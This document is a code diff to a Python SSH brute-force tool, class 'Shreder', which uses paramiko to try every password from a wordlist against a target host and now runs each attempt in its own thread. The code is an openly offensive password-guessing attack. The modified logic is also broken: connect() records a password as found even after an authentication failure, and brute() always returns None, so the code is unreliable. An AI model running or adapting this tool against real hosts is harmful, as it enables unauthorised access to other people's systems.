@@ -30,23 +30,32 @@ from threading import Thread
 from .badges import Badges
 
 class Shreder(Badges):
+    password = None
+
+    def connect(self, host, port, username, password):
+        ssh = paramiko.client.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            ssh.connect(host, port=int(port), username=username, password=password)
+        except paramiko.AuthenticationException:
+            ssh.close()
+        self.password = password
+
     def brute(self, host, port, username, dictionary):
         with open(dictionary, 'r') as f:
             state = 1
             lines = f.read().split('\n')
 
             for password in lines:
-                if password.strip():
-                    ssh = paramiko.client.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                if password.strip() and not self.password:
+                    self.print_multi(f"Proceeding... ({str(state)}/{str(len(lines))})")
 
-                    self.print_multi(f"Trying ({password})... ({str(state)}/{str(len(lines))})")
-                    try:
-                        ssh.connect(host, port=int(port), username=username, password=password)
-                    except paramiko.AuthenticationException:
-                        ssh.close()
-                    else:
-                        return password
+                    thread = Thread(
+                        target=self.connect,
+                        args=[host, port, username, password]
+                    )
+                    thread.start()
 
                     state += 1
             return None
